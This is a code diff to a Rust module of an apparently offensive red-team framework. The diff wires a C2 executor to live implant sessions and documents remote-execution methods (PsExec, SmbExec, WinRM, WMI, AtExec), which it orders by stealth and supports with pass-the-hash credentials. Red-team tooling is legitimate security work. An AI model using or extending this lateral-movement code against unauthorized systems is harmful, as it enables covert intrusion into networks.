@@ -20,34 +20,48 @@ pub mod smbexec;
 pub mod winrm;
 pub mod wmiexec;
 
+use crate::c2::C2Channel;
 use crate::error::Result;
 use async_trait::async_trait;
 use serde::{Deserialize, Serialize};
+use std::sync::Arc;
 
 /// Output from a remote command execution
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct ExecOutput {
+    /// Standard output captured from the remote command.
     pub stdout: String,
+    /// Standard error captured from the remote command.
     pub stderr: String,
+    /// Status or error code
     pub exit_code: Option<i32>,
+    /// Execution method that produced this output.
     pub method: ExecMethod,
 }
 
 /// Which execution method was used
 #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 pub enum ExecMethod {
+    /// `PsExec` variant
     PsExec,
+    /// `SmbExec` variant
     SmbExec,
+    /// `WinRM` variant
     WinRM,
+    /// `WmiExec` variant
     WmiExec,
+    /// `AtExec` variant
     AtExec,
     /// Execution via a loaded plugin
     Plugin {
+        /// Stable unique identifier.
         plugin_id: String,
     },
     /// Execution via a C2 framework session
     C2 {
+        /// C2 framework name.
         framework: String,
+        /// Stable unique identifier.
         session_id: String,
     },
 }
@@ -74,8 +88,11 @@ impl std::fmt::Display for ExecMethod {
 /// Credentials for remote execution
 #[derive(Debug, Clone)]
 pub struct ExecCredentials {
+    /// Domain FQDN
     pub domain: String,
+    /// Username for authentication
     pub username: String,
+    /// Password for authentication
     pub password: String,
     /// Optional: NTLM hash for pass-the-hash (hex string)
     pub nt_hash: Option<String>,
@@ -114,23 +131,39 @@ pub trait RemoteExecutor: Send + Sync {
 /// This lets C2 sessions participate in `auto_exec` alongside
 /// native execution methods.
 pub struct C2Executor {
+    /// Object or account name.
     pub framework_name: String,
+    /// Stable unique identifier.
     pub session_id: String,
+    /// Object or account name.
     pub session_hostname: String,
-    /// Shared reference to the C2 manager
-    /// In practice this would be Arc<RwLock<C2Manager>> but for the trait
-    /// we store the channel ref. The actual implementation calls through
-    /// the C2Manager in commands_impl.rs.
-    _marker: std::marker::PhantomData<()>,
+    /// Bound C2 channel for execution.
+    channel: Option<Arc<dyn C2Channel>>,
 }
 
 impl C2Executor {
+    /// Create an unbound C2 executor (availability checks only).
     pub fn new(framework_name: String, session_id: String, hostname: String) -> Self {
         Self {
             framework_name,
             session_id,
             session_hostname: hostname,
-            _marker: std::marker::PhantomData,
+            channel: None,
+        }
+    }
+
+    /// Create a C2 executor bound to a live channel.
+    pub fn with_channel(
+        framework_name: String,
+        session_id: String,
+        hostname: String,
+        channel: Arc<dyn C2Channel>,
+    ) -> Self {
+        Self {
+            framework_name,
+            session_id,
+            session_hostname: hostname,
+            channel: Some(channel),
         }
     }
 }
@@ -144,16 +177,21 @@ impl RemoteExecutor for C2Executor {
         }
     }
 
-    async fn execute(&self, _target: &str, _command: &str) -> Result<ExecOutput> {
-        // This is a stub — the real implementation must go through C2Manager
-        // because the C2Channel trait requires &self on the manager.
-        // In practice, commands_impl.rs calls c2_manager.exec_command() directly
-        // and wraps the result into ExecOutput.
-        Err(crate::error::OverthroneError::ExecSimple(format!(
-            "C2Executor::execute called directly — use C2Manager.exec_command() instead \
-             (session={}, framework={})",
-            self.session_id, self.framework_name
-        )))
+    async fn execute(&self, _target: &str, command: &str) -> Result<ExecOutput> {
+        let Some(channel) = &self.channel else {
+            return Err(crate::error::OverthroneError::ExecSimple(format!(
+                "C2Executor has no bound channel (session={}, framework={})",
+                self.session_id, self.framework_name
+            )));
+        };
+
+        let result = channel.exec_command(&self.session_id, command).await?;
+        Ok(ExecOutput {
+            stdout: result.output,
+            stderr: result.error,
+            exit_code: Some(if result.success { 0 } else { 1 }),
+            method: self.method(),
+        })
     }
 
     async fn check_available(&self, target: &str) -> bool {
@@ -174,9 +212,7 @@ fn base64_encode_ps(script: &str) -> String {
 }
 
 /// Try all available execution methods in order of stealth
-///
 /// Order: C2 (if session exists) → WinRM → AtExec → SmbExec → PSExec → WMI
-///
 /// If `c2_sessions` is provided, C2 sessions matching the target hostname
 /// are tried first (most OPSEC-safe since traffic goes through existing implant).
 pub async fn auto_exec(target: &str, command: &str, creds: &ExecCredentials) -> Result<ExecOutput> {
@@ -207,7 +243,6 @@ pub async fn auto_exec(target: &str, command: &str, creds: &ExecCredentials) -> 
 }
 
 /// Enhanced auto_exec that also considers C2 sessions
-///
 /// Tries C2 sessions first (best OPSEC), then falls back to native methods.
 pub async fn auto_exec_with_c2(
     target: &str,
